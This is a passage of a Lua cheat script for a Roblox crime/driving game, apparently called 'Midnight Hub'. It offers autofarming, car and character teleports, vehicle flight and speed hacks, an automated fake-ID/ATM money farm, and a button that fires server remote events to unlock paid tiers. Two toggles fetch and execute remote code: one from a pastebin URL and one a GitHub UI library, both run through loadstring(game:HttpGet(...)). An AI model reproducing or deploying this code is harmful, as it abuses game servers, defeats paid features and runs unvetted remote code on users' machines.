            end
        end)
    end
})





AutofarmGroup:AddToggle('Rob Farm(DETECTED)', {
    Text = "Rob Autofarm/TP AUTOLOOT",
    Tooltip = "Enables Rob Autofarm and TP Autoloot.",
    Callback = function()
        print("Rob Autofarm Enabled")
        loadstring(game:HttpGet('https://pastebin.com/raw/h7cZRbxn'))()
    end
})




CarGroup:AddDropdown('SelectVehicleToSpawn', {
    Values = {
        "Chrysler300",
        "SRT",
        "BWM M3 Competition",
        "Sprinter Van",
        "Escalade",
        "Infiniti Q50s",
        "AMG GLE 53",
        "Chevy Tahoe",
        "Nissan GTR",
        "Corvette C7",
        "Ram TRX",
        "DirtBike",
        "Trackhawk",
        "Hellcat",
        "Porsche",
        "2010 Wrangler"
    },
    Default = 1,
    Multi = false,
    Text = 'Select Vehicle To Spawn',
    Tooltip = 'Choose a vehicle to spawn.'
})

CarGroup:AddButton('Spawn Selected Vehicle', function()
    local selected = Options.SelectVehicleToSpawn.Value
    if selected then
        local args = {
            [1] = "Spawn",
            [2] = selected
        }
        game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Dealershipinteraction"):FireServer(unpack(args))
    end
end)


CarGroup:AddDropdown('SelectVehicleToPurchase', {
    Values = {
        'Trackhawk',
        'Hellcat',
        'Porsche',
        'Chrysler300',
        'SRT',
        'BWM M3 Competition',
        'Sprinter Van',
        'Escalade',
        'Infiniti Q50s',
        'AMG GLE 53',
        'Nissan GTR',
        'Chevy Tahoe',
        'Corvette C7',
        'Ram TRX',
        '2010 Wrangler',
        'DirtBike',
    },
    Default = 1,
    Multi = false,
    Text = 'Select Vehicle To Purchase',
    Tooltip = 'Select a vehicle to purchase from the dealership.',
    Callback = function(selected)
        if selected and selected ~= '' then
            local args = {
                [1] = 'Purchase',
                [2] = selected,
            }
            game:GetService('ReplicatedStorage')
                :WaitForChild('RemoteEvents')
                :WaitForChild('Dealershipinteraction')
                :FireServer(unpack(args))
        end
    end
})


CarGroup:AddButton({
    Text = "Refresh Bike",
    Func = function()
        local args = {
            [1] = "RefreshVehicle"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("ClientEffects"):FireServer(unpack(args))
    end,
    DoubleClick = false, -- optional
    Tooltip = "Refresh your Vehicle"
})


CarGroup:AddButton("Teleport to Vehicle", function()
    local player = game.Players.LocalPlayer
    local function tptovehicle()
        local myCar = workspace:FindFirstChild(player.Name .. "'s Car")
        if not myCar then return end
        local driveSeat = myCar:FindFirstChild("DriveSeat")
        if not driveSeat or not driveSeat:IsA("VehicleSeat") then return end
        local me = player.Character or player.CharacterAdded:Wait()
        me:MoveTo(driveSeat.Position)
        driveSeat:Sit(me.Humanoid)
    end
    tptovehicle()
end)


DamageGroup:AddDropdown('Gunshop1', {
    Text = "Bike Tps",
    Values = {
        "Teleport to Gunshop 1",
        "Teleport to Gunshop 2",
        "Teleport to Tier Gun Shop",
        "Teleport to Dealership",
        "Teleport to Fake ID Seller",
        "Teleport to Apply For ID",
        "Teleport to Box Job",
        "Teleport to Chips Autofarm",
        "Teleport to Casino Rob Room",
        "Teleport to Apartment 1",
        "Teleport to Marshmallow Farm Cooking Hotel",
        "Teleport to Apartment 2"
    },
    Default = "Teleport to Gunshop 1",
    Tooltip = "Teleport your car to Gunshop 1, Gunshop 2, Tier Gun Shop, Dealership, Fake ID Seller, Apply For ID, Box Job, Chips Autofarm, Casino Rob Room, Apartment 1, Marshmallow Farm Cooking Hotel, or Apartment 2 location.",
    Callback = function(option)
        local player = game.Players.LocalPlayer
        local function MC(x, y, z)
            local myCar = workspace:FindFirstChild(player.Name .. "'s Car")
            if myCar and myCar.PrimaryPart then
                myCar:SetPrimaryPartCFrame(CFrame.new(x, y + 4, z))
            else
                warn("Car not found or missing PrimaryPart!")
            end
        end
        if option == "Teleport to Gunshop 1" then
            MC(-492, 4, 356)
        elseif option == "Teleport to Gunshop 2" then
            MC(214, 5, -176)
        elseif option == "Teleport to Tier Gun Shop" then
            MC(1133, 5, 177)
        elseif option == "Teleport to Dealership" then
            MC(725, 3, 390)
        elseif option == "Teleport to Fake ID Seller" then
            MC(208, 4, -350)
        elseif option == "Teleport to Apply For ID" then
            MC(-54, 4, -336)
        elseif option == "Teleport to Box Job" then
            MC(-503, 3, -81)
        elseif option == "Teleport to Chips Autofarm" then
            MC(-478, 4, -470)
        elseif option == "Teleport to Casino Rob Room" then
            MC(1158, 20, 30)
        elseif option == "Teleport to Apartment 1" then
            MC(1191, 4, -253)
        elseif option == "Teleport to Marshmallow Farm Cooking Hotel" then
            MC(1094, 3, 426)
        elseif option == "Teleport to Apartment 2" then
            MC(-518, 3, 132)
        end
    end
})


DamageGroup:AddDropdown('Gunshop1', {
    Text = "HOMELESS GUY TPS",
    Values = {
        "Teleport to Homeless Guy 1",
        "Teleport to Homeless Guy 2",
        "Teleport to Homeless Guy 3",
        "Teleport to Homeless Guy 4",
        "Teleport to Homeless Guy 5",
        "Teleport to Homeless Guy 6",
        "Teleport to Homeless Guy 7",
        "Teleport to Homeless Guy 8",
        "Teleport to Homeless Guy 9",
        "Teleport to Hot Chip Guy",
    },
    Default = "Teleport to Gunshop 1",
    Tooltip = "Teleport your car to Homeless Guy 1, Homeless Guy 2, Homeless Guy 3, Homeless Guy 4, Homeless Guy 5, Homeless Guy 6, Homeless Guy 7, Homeless Guy 8, Homeless Guy 9, Hot Chip Guy,",
    Callback = function(option)
        local player = game.Players.LocalPlayer
        local function MC(x, y, z)
            local myCar = workspace:FindFirstChild(player.Name .. "'s Car")
            if myCar and myCar.PrimaryPart then
                myCar:SetPrimaryPartCFrame(CFrame.new(x, y + 4, z))
            else
                warn("Car not found or missing PrimaryPart!")
            end
        end
        if option == "Teleport to Homeless Guy 1" then
            MC(700, 4, -419)
        elseif option == "Teleport to Homeless Guy 2" then
            MC(525, 3, -289)
        elseif option == "Teleport to Homeless Guy 3" then
            MC(54, 4, -420)
        elseif option == "Teleport to Homeless Guy 4" then
            MC(-313, 4, -367)
        elseif option == "Teleport to Homeless Guy 5" then
            MC(-523, -8, -171)
        elseif option == "Teleport to Homeless Guy 6" then
            MC(-274, 4, -207)
        elseif option == "Teleport to Homeless Guy 7" then
            MC(156, 4, -215)
        elseif option == "Teleport to Homeless Guy 8" then
            MC(65, 4, 75)
        elseif option == "Teleport to Homeless Guy 9" then
            MC(26, 4, 213)
          elseif option == "Teleport to Hot Chip Guy" then
            MC(-27, 4, -25)
        end
    end
})


CarGroup:AddToggle('MyToggle', {
    Text = "Vehicle Mod",
    Default = false,
    Callback = function(State)
        local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xovanDJX/Backup/main/Venyx%20UI%20Library"))()
        local venyx = library.new("Midnight Hub CAR SPEED | SB", 5013109572)
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local UserInputService = game:GetService("UserInputService")
        local LocalPlayer = Players.LocalPlayer

        local themes = {
            Background = Color3.fromRGB(31, 31, 103),
            Glow = Color3.fromRGB(60, 63, 221),
            Accent = Color3.fromRGB(55, 52, 90),
            LightContrast = Color3.fromRGB(64, 65, 128),
            DarkContrast = Color3.fromRGB(32, 33, 64),
            TextColor = Color3.fromRGB(255, 255, 255)
        }

        local function GetVehicleFromDescendant(Descendant)
            return
                Descendant:FindFirstAncestor(LocalPlayer.Name .. "'s Car") or
                (Descendant:FindFirstAncestor("Body") and Descendant:FindFirstAncestor("Body").Parent) or
                (Descendant:FindFirstAncestor("Misc") and Descendant:FindFirstAncestor("Misc").Parent) or
                Descendant:FindFirstAncestorWhichIsA("Model")
        end

        local function TeleportVehicle(CoordinateFrame)
            local Parent = LocalPlayer.Character.Parent
            local Vehicle = GetVehicleFromDescendant(LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").SeatPart)
            LocalPlayer.Character.Parent = Vehicle
            local success, response = pcall(function()
                return Vehicle:SetPrimaryPartCFrame(CoordinateFrame)
            end)
            if not success then
                return Vehicle:MoveTo(CoordinateFrame.Position)
            end
        end

        local vehiclePage = venyx:addPage("Vehicle", 8356815386)
        local usageSection = vehiclePage:addSection("Usage")
        local velocityEnabled = true
        usageSection:addToggle("Keybinds Active", velocityEnabled, function(v) velocityEnabled = v end)
        local flightSection = vehiclePage:addSection("Flight")
        local flightEnabled = false
        local flightSpeed = 1
        flightSection:addToggle("Enabled", false, function(v) flightEnabled = v end)
        flightSection:addSlider("Speed", 100, 0, 800, function(v) flightSpeed = v / 100 end)
        local defaultCharacterParent
        RunService.Stepped:Connect(function()
            local Character = LocalPlayer.Character
            if flightEnabled == true then
                if Character and typeof(Character) == "Instance" then
                    local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
                    if Humanoid and typeof(Humanoid) == "Instance" then
                        local SeatPart = Humanoid.SeatPart
                        if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then
                            local Vehicle = GetVehicleFromDescendant(SeatPart)
                            if Vehicle and Vehicle:IsA("Model") then
                                Character.Parent = Vehicle
                                if not Vehicle.PrimaryPart then
                                    if SeatPart.Parent == Vehicle then
                                        Vehicle.PrimaryPart = SeatPart
                                    else
                                        Vehicle.PrimaryPart = Vehicle:FindFirstChildWhichIsA("BasePart")
                                    end
                                end
                                local PrimaryPartCFrame = Vehicle:GetPrimaryPartCFrame()
                                Vehicle:SetPrimaryPartCFrame(CFrame.new(PrimaryPartCFrame.Position, PrimaryPartCFrame.Position + workspace.CurrentCamera.CFrame.LookVector) * (UserInputService:GetFocusedTextBox() and CFrame.new(0, 0, 0) or CFrame.new((UserInputService:IsKeyDown(Enum.KeyCode.D) and flightSpeed) or (UserInputService:IsKeyDown(Enum.KeyCode.A) and -flightSpeed) or 0, (UserInputService:IsKeyDown(Enum.KeyCode.E) and flightSpeed / 2) or (UserInputService:IsKeyDown(Enum.KeyCode.Q) and -flightSpeed / 2) or 0, (UserInputService:IsKeyDown(Enum.KeyCode.S) and flightSpeed) or (UserInputService:IsKeyDown(Enum.KeyCode.W) and -flightSpeed) or 0)))
                                SeatPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                                SeatPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                            end
                        end
                    end
                end
            else
                if Character and typeof(Character) == "Instance" then
                    Character.Parent = defaultCharacterParent or Character.Parent
                    defaultCharacterParent = Character.Parent
                end
            end
        end)
        local speedSection = vehiclePage:addSection("Acceleration")
        local velocityMult = 0.025
        speedSection:addSlider("Multiplier (Thousandths)", 25, 0, 50, function(v) velocityMult = v / 1000 end)
        local velocityEnabledKeyCode = Enum.KeyCode.W
        speedSection:addKeybind("Velocity Enabled", velocityEnabledKeyCode, function()
            if not velocityEnabled then return end
            while UserInputService:IsKeyDown(velocityEnabledKeyCode) do
                task.wait(0)
                local Character = LocalPlayer.Character
                if Character and typeof(Character) == "Instance" then
                    local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
                    if Humanoid and typeof(Humanoid) == "Instance" then
                        local SeatPart = Humanoid.SeatPart
                        if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then
                            SeatPart.AssemblyLinearVelocity *= Vector3.new(1 + velocityMult, 1, 1 + velocityMult)
                        end
                    end
                end
                if not velocityEnabled then break end
            end
        end, function(v) velocityEnabledKeyCode = v.KeyCode end)
        local decelerateSelection = vehiclePage:addSection("Deceleration")
        local qbEnabledKeyCode = Enum.KeyCode.S
        local velocityMult2 = 150e-3
        decelerateSelection:addSlider("Brake Force (Thousandths)", velocityMult2*1e3, 0, 300, function(v) velocityMult2 = v / 1000 end)
        decelerateSelection:addKeybind("Quick Brake Enabled", qbEnabledKeyCode, function()
            if not velocityEnabled then return end
            while UserInputService:IsKeyDown(qbEnabledKeyCode) do
                task.wait(0)
                local Character = LocalPlayer.Character
                if Character and typeof(Character) == "Instance" then
                    local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
                    if Humanoid and typeof(Humanoid) == "Instance" then
                        local SeatPart = Humanoid.SeatPart
                        if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then
                            SeatPart.AssemblyLinearVelocity *= Vector3.new(1 - velocityMult2, 1, 1 - velocityMult2)
                        end
                    end
                end
                if not velocityEnabled then break end
            end
        end, function(v) qbEnabledKeyCode = v.KeyCode end)
        decelerateSelection:addKeybind("Stop the Vehicle", Enum.KeyCode.P, function(v)
            if not velocityEnabled then return end
            local Character = LocalPlayer.Character
            if Character and typeof(Character) == "Instance" then
                local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
                if Humanoid and typeof(Humanoid) == "Instance" then
                    local SeatPart = Humanoid.SeatPart
                    if SeatPart and typeof(SeatPart) == "Instance" and SeatPart:IsA("VehicleSeat") then
                        SeatPart.AssemblyLinearVelocity *= Vector3.new(0, 0, 0)
                        SeatPart.AssemblyAngularVelocity *= Vector3.new(0, 0, 0)
                    end
                end
            end
        end)

        repeat task.wait(0) until game:IsLoaded() and game.PlaceId > 0
        if game.PlaceId == 3351674303 then
            local drivingEmpirePage = venyx:addPage("Wayfort", 8357222903)
            local dealershipSection = drivingEmpirePage:addSection("Vehicle Dealership")
            local dealershipList = {}
            for index, value in pairs(workspace:WaitForChild("Game"):WaitForChild("Dealerships"):WaitForChild("Dealerships"):GetChildren()) do
                table.insert(dealershipList, value.Name)
            end
            dealershipSection:addDropdown("Dealership", dealershipList, function(v)
                game:GetService("ReplicatedStorage").Remotes.Location:FireServer("Enter", v)
            end)
        elseif game.PlaceId == 891852901 then
            local greenvillePage = venyx:addPage("Greenville", 8360925727)
        elseif game.PlaceId == 54865335 then
            local ultimateDrivingPage = venyx:addPage("Westover", 8360954483)
        elseif game.PlaceId == 5232896677 then
            local pacificoPage = venyx:addPage("Pacifico", 3028235557)
        end
    end
})


local selectedSkybox = "Default"

VisualsGroup:AddDropdown('SkyboxDropdown', {
    Text = "Skybox",
    Values = {
        "Default",
        "Galaxy",
        "City Night",
        "Night Lit",
        "Neptune",
        "Among Us",
        "DaBaby",
        "Redshift",
        "Blue Aurora"
    },
    Default = "Default",
    Tooltip = "Select a skybox to apply.",
    Callback = function(option)
        selectedSkybox = option
    end
})

VisualsGroup:AddToggle('ApplySkybox', {
    Text = "Apply Skybox",
    Tooltip = "Apply the selected skybox.",
    Callback = function()
        local skybox
        for _, child in ipairs(game.Lighting:GetChildren()) do
            if child:IsA("Sky") then
                skybox = child
                break
            end
        end
        if not skybox then
            warn("No skybox found.")
            return
        end
        if selectedSkybox == "Default" then
            skybox.SkyboxBk = "http://www.roblox.com/asset/?id=144933338"
            skybox.SkyboxDn = "http://www.roblox.com/asset/?id=144931530"
            skybox.SkyboxFt = "http://www.roblox.com/asset/?id=144931530"
            skybox.SkyboxLf = "http://www.roblox.com/asset/?id=144933244"
            skybox.SkyboxRt = "http://www.roblox.com/asset/?id=144933299"
            skybox.SkyboxUp = "http://www.roblox.com/asset/?id=144931564"
        elseif selectedSkybox == "Galaxy" then
            skybox.SkyboxBk = "rbxassetid://159454299"
            skybox.SkyboxDn = "rbxassetid://159454296"
            skybox.SkyboxFt = "rbxassetid://159454293"
            skybox.SkyboxLf = "rbxassetid://159454286"
            skybox.SkyboxRt = "rbxassetid://159454300"
            skybox.SkyboxUp = "rbxassetid://159454288"
        elseif selectedSkybox == "City Night" then
            skybox.SkyboxBk = "rbxassetid://9758787043"
            skybox.SkyboxDn = "rbxassetid://9758786250"
            skybox.SkyboxFt = "rbxassetid://9758784754"
            skybox.SkyboxLf = "rbxassetid://9758785370"
            skybox.SkyboxRt = "rbxassetid://9758783070"
            skybox.SkyboxUp = "rbxassetid://9758783885"
        elseif selectedSkybox == "Night Lit" then
            skybox.SkyboxBk = "rbxassetid://154185004"
            skybox.SkyboxDn = "rbxassetid://154184960"
            skybox.SkyboxFt = "rbxassetid://154185021"
            skybox.SkyboxLf = "rbxassetid://154184943"
            skybox.SkyboxRt = "rbxassetid://154184972"
            skybox.SkyboxUp = "rbxassetid://154185031"
        elseif selectedSkybox == "Neptune" then
            skybox.SkyboxBk = "rbxassetid://218955819"
            skybox.SkyboxDn = "rbxassetid://218953419"
            skybox.SkyboxFt = "rbxassetid://218954524"
            skybox.SkyboxLf = "rbxassetid://218958493"
            skybox.SkyboxRt = "rbxassetid://218957134"
            skybox.SkyboxUp = "rbxassetid://218950090"
        elseif selectedSkybox == "Among Us" then
            skybox.SkyboxBk = "rbxassetid://5752463190"
            skybox.SkyboxDn = "rbxassetid://5752463190"
            skybox.SkyboxFt = "rbxassetid://5752463190"
            skybox.SkyboxLf = "rbxassetid://5752463190"
            skybox.SkyboxRt = "rbxassetid://5752463190"
            skybox.SkyboxUp = "rbxassetid://5752463190"
        elseif selectedSkybox == "DaBaby" then
            skybox.SkyboxBk = "rbxassetid://7245418472"
            skybox.SkyboxDn = "rbxassetid://7245418472"
            skybox.SkyboxFt = "rbxassetid://7245418472"
            skybox.SkyboxLf = "rbxassetid://7245418472"
            skybox.SkyboxRt = "rbxassetid://7245418472"
            skybox.SkyboxUp = "rbxassetid://7245418472"
        elseif selectedSkybox == "Redshift" then
            skybox.SkyboxBk = "rbxassetid://401664839"
            skybox.SkyboxDn = "rbxassetid://401664862"
            skybox.SkyboxFt = "rbxassetid://401664960"
            skybox.SkyboxLf = "rbxassetid://401664881"
            skybox.SkyboxRt = "rbxassetid://401664901"
            skybox.SkyboxUp = "rbxassetid://401664936"
        elseif selectedSkybox == "Blue Aurora" then
            skybox.SkyboxBk = "rbxassetid://12063984"
            skybox.SkyboxDn = "rbxassetid://12064107"
            skybox.SkyboxFt = "rbxassetid://12064152"
            skybox.SkyboxLf = "rbxassetid://12064121"
            skybox.SkyboxRt = "rbxassetid://12064115"
            skybox.SkyboxUp = "rbxassetid://12064131"
        end
    end
})


AutofarmGroup:AddToggle('ATM Farm', {
    Text = "ATM Farm(use autoclicker after one swipe)",
    Default = false,
    Tooltip = "Automatically farms ATMs and moves with WASD.",
    Callback = function(Value)
        getgenv().AutoFarm = Value
        if Value then
            local cloneref = cloneref or function(...) return ... end
            local plrs = cloneref(game:GetService("Players"))
            local lp = plrs.LocalPlayer

            local TweenService = game:GetService("TweenService")
            local GuiService = game:GetService("GuiService")
            local VirtualInputManager = game:GetService("VirtualInputManager")

            local function pressAllWASD()
                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.W, false, game)
                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.A, false, game)
                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.S, false, game)
                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.D, false, game)
                -- Move around in a pattern
                task.wait(0.1)
                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.A, false, game)
                task.wait(0.1)
                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.S, false, game)
                task.wait(0.1)
                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.W, false, game)
                task.wait(0.1)
                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.D, false, game)
                task.wait(0.1)
                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.A, false, game)
                task.wait(0.1)
                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.S, false, game)
                task.wait(0.1)
                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.W, false, game)
                task.wait(0.1)
                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.D, false, game)
            end

            local character = lp.Character or lp.CharacterAdded:Wait()
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

            local function stopMoving()
                if IMM then IMM = false end
            end

            local function MTP(xxx, uty)
                if not getgenv().AutoFarm or IMM then return end
                IMM = true

                local SS = 1.7
                local humanoidRootPart = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
                if not humanoidRootPart then return end

                local TY = uty and xxx.Y or humanoidRootPart.Position.Y
                local xxxWithY = Vector3.new(xxx.X, TY, xxx.Z)
                local distance = (Vector2.new(xxxWithY.X, xxxWithY.Z) - Vector2.new(humanoidRootPart.Position.X, humanoidRootPart.Position.Z)).Magnitude

                while distance > SS and getgenv().AutoFarm do
                    local currentPosition = humanoidRootPart.Position
                    local xxxWithY = Vector3.new(xxx.X, uty and xxx.Y or currentPosition.Y, xxx.Z)
                    local direction = (xxxWithY - currentPosition).Unit
                    distance = (Vector2.new(xxxWithY.X, xxxWithY.Z) - Vector2.new(currentPosition.X, currentPosition.Z)).Magnitude
                    local nextPosition = currentPosition + direction * SS
                    humanoidRootPart.CFrame = CFrame.new(nextPosition, nextPosition + direction)
                    task.wait(0.1)
                end

                if distance <= SS then
                    humanoidRootPart.CFrame = CFrame.new(Vector3.new(xxx.X, uty and xxx.Y or humanoidRootPart.Position.Y, xxx.Z))
                end

                IMM = false
            end

            local function teleportToNearestVisibleATM()
                local closestATM, closestDistance = nil, math.huge

                for _, atm in pairs(workspace.Map.ATMS:GetChildren()) do
                    local atmScreen = atm:FindFirstChild("ATMScreen")
                    if atmScreen and atmScreen.Transparency == 0 then
                        local distance = (humanoidRootPart.Position - atm.Position).Magnitude
                        if distance < closestDistance then
                            closestDistance = distance
                            closestATM = atm
                        end
                    end
                end

                if closestATM then
                    local frontATMPos = closestATM.Position + (closestATM.CFrame.LookVector * -3)
                    MTP(frontATMPos, true)
                    return closestATM
                end
            end

            local function spamProximityPrompt(prompt, duration)
                local startTime = tick()
                while tick() - startTime < duration and getgenv().AutoFarm do
                    fireproximityprompt(prompt)
                    task.wait(0.1)
                end
            end

            local function hasTool(toolName)
                local backpack = lp:WaitForChild("Backpack")
                return backpack:FindFirstChild(toolName) or character:FindFirstChild(toolName)
            end

            local function equipTool(toolName)
                local backpack = lp:WaitForChild("Backpack")
                local tool = backpack:FindFirstChild(toolName) or character:FindFirstChild(toolName)
                if tool and tool.Parent == backpack then
                    tool.Parent = character
                end
            end

            local function pressButtonWithSelection()
                local atmGUI = lp.PlayerGui:FindFirstChild("ATM")
                if atmGUI then
                    local atmFrame = atmGUI:FindFirstChild("Frame")
                    local button = atmFrame and atmFrame:FindFirstChild("Swipe")

                    if button and button:IsA("TextButton") then
                        GuiService.SelectedObject = button
                        task.wait(0.3)
                        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                        task.wait(0.2)
                        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                    end
                end
            end

            local function performActions()
                while getgenv().AutoFarm do
                    MTP(Vector3.new(217, 4, -332), true)

                    local fakeIDSeller = workspace:WaitForChild("NPCs"):FindFirstChild("FakeIDSeller")
                    if fakeIDSeller then
                        local prompt = fakeIDSeller:FindFirstChild("UpperTorso")
                            and fakeIDSeller.UpperTorso:FindFirstChild("Attachment")
                            and fakeIDSeller.UpperTorso.Attachment:FindFirstChild("ProximityPrompt")
                        if prompt then
                            while not hasTool("Fake ID") and getgenv().AutoFarm do
                                spamProximityPrompt(prompt, 3)
                                task.wait(1)
                            end
                        end
                    end

                    equipTool("Fake ID")
                    task.wait(1)

                    if not hasTool("Fake ID") then continue end

                    MTP(Vector3.new(-50, 4, -321), true)

                    local bankTeller = workspace:WaitForChild("NPCs"):FindFirstChild("Bank Teller")
                    if bankTeller then
                        local prompt = bankTeller:FindFirstChild("UpperTorso")
                            and bankTeller.UpperTorso:FindFirstChild("Attachment")
                            and bankTeller.UpperTorso.Attachment:FindFirstChild("ProximityPrompt")
                        if prompt then
                            spamProximityPrompt(prompt, 3)
                        end
                    end

                    task.wait(40)

                    MTP(Vector3.new(-42, 4, -334), true)

                    local blank = workspace:FindFirstChild("Blank")
                    if blank then
                        local prompt = blank:FindFirstChild("Attachment") and blank.Attachment:FindFirstChild("ProximityPrompt")
                        if prompt then
                            spamProximityPrompt(prompt, 3)
                        end
                    end

                    if not hasTool("Card") then continue end

                    local nearestATM = teleportToNearestVisibleATM()
                    if nearestATM then
                        if nearestATM:FindFirstChild("ATMScreen") and nearestATM.ATMScreen.Transparency == 1 then
                            Obsidian:Notify({
                                Title = "ATM FARM",
                                Content = "Atm got used.  going to next atm",
                                Duration = 6.5,
                                Image = "x",
                            })
                            stopMoving()
                            teleportToNearestVisibleATM()
                        else
                            local prompt = nearestATM:FindFirstChild("Attachment") and nearestATM.Attachment:FindFirstChild("ProximityPrompt")
                            if prompt then
                                equipTool("Card")
                                pressAllWASD()
                                spamProximityPrompt(prompt, 5)
                            end
                        end
                    end

                    pressButtonWithSelection()
                    while getgenv().AutoFarm do
                        if not hasTool("Card") then break end
                        task.wait(1.2)
                    end
                end
            end

            task.spawn(performActions)
        end
    end
})



-- Add this to your Misc group in your UI library

MiscGroup:AddButton("FreeTiers 1,2,3 ExtraHotChipMoney", function()
    local fucks = {"TIER_1", "TIER_2", "TIER_3", "ExtraHotChipsMoneyEnabled"}
    for _, attr in ipairs(fucks) do
        local args = {
            "UpdateSettingAttribute",
            {
                Attribute = attr,
                Enabled = false
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("ClientEffects"):FireServer(unpack(args))
    end
end, "Sets TIER_1, TIER_2, TIER_3, and ExtraHotChipsMoneyEnabled to false.")


DamageGroup:AddDropdown("DamageTeleports", {
    Text = "Damage Teleports",
    Values = {
        "Bank", "Tier Gun Shop", "Box Job", "Clothing Store", "Main Gun",
        "Dealership", "Dealership Apartment", "Fake Id Seller", "Marshmallow Farm Dealer",
        "Marshmallow Farm Apartments", "ATM1", "ATM2", "ATM3", "ATM4", "ATM5", "ATM6",
        "ATM7", "ATM8", "ATM9", "ATM10", "ATM11", "ATM12"
    },
    Default = "Bank",
    Multi = false,
    Tooltip = "Select a location to teleport using damage method.",
    Callback = function(selected)
        local teleportLocations = {
            ["Bank"] = Vector3.new(-51, 4, -325),
            ["Tier Gun Shop"] = Vector3.new(1138, 4, 175),
            ["Box Job"] = Vector3.new(-555, 4, -78),
            ["Clothing Store"] = Vector3.new(-201, 3, -65),
            ["Main Gun"] = Vector3.new(219, 4, -174),
            ["Dealership"] = Vector3.new(730, 4, 444),
            ["Dealership Apartment"] = Vector3.new(716, 4, 550),
            ["Fake Id Seller"] = Vector3.new(219, 4, -332),
            ["Marshmallow Farm Dealer"] = Vector3.new(511, 4, 599),
            ["Marshmallow Farm Apartments"] = Vector3.new(1090, 3, 419),
            ["ATM1"] = Vector3.new(-32, 4, -300),
            ["ATM2"] = Vector3.new(538, 4, -349),
            ["ATM3"] = Vector3.new(498, 4, 406),
            ["ATM4"] = Vector3.new(237, 4, -159),
            ["ATM5"] = Vector3.new(-651, 4, 158),
            ["ATM6"] = Vector3.new(-454, 4, 374),
            ["ATM7"] = Vector3.new(-267, 4, -209),
            ["ATM8"] = Vector3.new(-11, 4, 234),
            ["ATM9"] = Vector3.new(717, 4, 414),
            ["ATM10"] = Vector3.new(-536, 4, -20),
            ["ATM11"] = Vector3.new(-651, 4, 158),
            ["ATM12"] = Vector3.new(698, 4, -240),
        }

        if not selected or not teleportLocations[selected] then return end

        local function showTeleportScreen()
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "MidnightHubTeleportScreen"
            screenGui.IgnoreGuiInset = true
            screenGui.ResetOnSpawn = false
            screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(1, 0, 1, 0)
            frame.Position = UDim2.new(0, 0, 0, 0)
            frame.BackgroundColor3 = Color3.new(0, 0, 0)
            frame.BorderSizePixel = 0
            frame.Parent = screenGui

            local title = Instance.new("TextLabel")
            title.Text = "Midnight Hub Teleporting..."
            title.Font = Enum.Font.GothamBold
            title.TextSize = 48
            title.TextColor3 = Color3.new(1, 1, 1)
            title.BackgroundTransparency = 1
            title.Size = UDim2.new(1, 0, 0, 80)
            title.Position = UDim2.new(0, 0, 0.4, 0)
            title.Parent = frame

            screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
            return screenGui
        end

        local function hideTeleportScreen(gui)
            if gui and gui.Parent then
                gui:Destroy()
            end
        end

        local screenGui = showTeleportScreen()

        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Workspace = game:GetService("Workspace")

        local LocalPlayer = Players.LocalPlayer
        local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local Humanoid = Character:WaitForChild("Humanoid")
        local HRP = Character:WaitForChild("HumanoidRootPart")

        local HomelessStorage = ReplicatedStorage:WaitForChild("Workspace"):WaitForChild("Homeless")
        local HomelessLive = Workspace:WaitForChild("HomelessPeople")

        local function getDistance(a, b)
            return (a - b).Magnitude
        end

        local function desyncTeleport(pos)
            Character:PivotTo(CFrame.new(pos))
            task.wait(0.05)
            Humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
            task.wait(0.05)
            Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
        end

        local function findClosestHiddenHomeless()
            local closest, closestDist = nil, math.huge
            for _, h in ipairs(HomelessStorage:GetChildren()) do
                if h:IsA("Model") and h:FindFirstChild("HumanoidRootPart") then
                    local dist = getDistance(HRP.Position, h.HumanoidRootPart.Position)
                    if dist < closestDist then
                        closest = h
                        closestDist = dist
                    end
                end
            end
            return closest
        end

        local function homelessFastTp(targetPos)
            local hidden = findClosestHiddenHomeless()
            if not hidden then warn("No homeless") hideTeleportScreen(screenGui) return end

            local pos = hidden.HumanoidRootPart.Position
            desyncTeleport(pos)

            local spawnTimeout = os.clock() + 10
            local liveHomeless = nil
            repeat
                liveHomeless = HomelessLive:FindFirstChild(hidden.Name)
                if not liveHomeless then
                    if getDistance(HRP.Position, pos) > 10 then
                        desyncTeleport(pos)
                    end
                    task.wait(0.05)
                end
            until liveHomeless or os.clock() > spawnTimeout

            if not liveHomeless then hideTeleportScreen(screenGui) return end

